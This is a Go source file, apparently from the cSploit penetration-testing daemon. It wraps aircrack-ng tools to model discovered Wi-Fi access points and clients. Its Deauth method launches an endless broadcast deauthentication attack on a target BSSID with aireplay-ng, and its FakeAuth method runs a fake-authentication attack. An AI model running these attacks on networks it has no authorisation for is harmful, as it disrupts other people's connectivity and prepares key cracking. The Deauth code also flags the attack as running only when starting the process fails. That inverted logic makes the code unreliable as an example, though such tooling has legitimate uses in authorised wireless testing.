package AP

import (
	"os/exec"
	"strings"
	"time"

	"github.com/cSploit/daemon/tools/aircrack/attacks"
)

// JSON exportable structs
type (
	// AP discovered thanks to airodump-ng
	AP struct {
		Bssid   string `json:"bssid"`
		First   string `json:"first_seen_at"`
		Last    string `json:"last_seen_at"`
		Channel int    `json:"channel"`
		Speed   int    `json:"speed"`
		Privacy string `json:"privacy"`
		Cipher  string `json:"cipher"`
		Auth    string `json:"auth"`
		Power   int    `json:"power"`
		Beacons int    `json:"beacons"`
		IVs     int    `json:"ivs"`
		Lan     string `json:"lan_ip"`
		IdLen   int    `json:"id_len"`
		Essid   string `json:"essid"`
		Key     string `json:"key"`
		//Wps     bool   `json:"wps"`
	}

	// Client discovered
	Client struct {
		// MAC address
		Station string `json:"station"`
		First   string `json:"first_seen_at"`
		Last    string `json:"last_seen_at"`
		Power   int    `json:"power"`
		Packets int    `json:"packets"`
		Bssid   string `json:"bssid"`
		Probed  string `json:"probed_essids"`
	}
)

// TODO: GenKeys(): gen default keys (routerkeygen)

// DEAUTH infinitely the AP using broadcast address
func (a *AP) Deauth(iface string) (attacks.Attack, error) {
	cmd := exec.Command("aireplay-ng", "-0", "0", "-a", a.Bssid, iface)

	err := cmd.Start() // Do not wait

	cur_atk := attacks.Attack{
		Type:    "Deauth",
		Target:  a.Bssid,
		Running: false,
		Started: time.Now().String(),
	}

	if err != nil {
		cur_atk.Running = true
		cur_atk.Init(cmd.Process)
	}

	return cur_atk, err
}

// Try a fake auth on the ap
// !! May take some time, better if runned in a goroutine
func (a *AP) FakeAuth(iface string) (bool, error) {
	cmd := exec.Command("aireplay-ng", "-1", "0", "-a", a.Bssid, "-T", "1", iface)

	output, err := cmd.Output()

	if err != nil {
		return false, err
	}

	if strings.Contains(string(output), "Association successful") {
		return true, nil
	} else {
		return false, nil
	}
}
